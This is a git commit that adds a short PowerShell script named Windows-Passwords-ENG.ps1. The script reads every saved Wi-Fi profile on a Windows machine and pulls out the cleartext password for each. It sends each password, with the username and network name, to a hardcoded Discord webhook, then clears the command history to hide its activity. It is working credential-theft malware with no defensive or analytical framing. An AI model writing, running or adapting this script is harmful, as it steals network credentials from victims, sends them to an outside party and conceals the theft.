b76147e4472f5fbc47cbe87ebe1de84cbe6d2800
Joel A Marinay Jr <66583724+joel2128@users.noreply.github.com>
2024-10-20 12:44:32 +0800

    Create Windows-Passwords-ENG.ps1

---
+++ Windows-Passwords-ENG.ps1
@@ -0,0 +1,19 @@
+
+# ENG
+netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
+    $wlan  = $_.Matches.Value
+    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
+	$discord='https://discord.com/api/webhooks/1297408069793353748/iQk3KY2n9HivodUu8nENgaQl_PJhnF8LapPJl6GYHyWP4qA2WKA8Z2hNOLITZIEKW6tR'
+
+	$Body = @{
+		'username' = $env:username + " | " + [string]$wlan
+		'content' = [string]$passw
+	}
+	
+	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+}
+
+echo "panis"
+
+# Clear the PowerShell command history
+Clear-History
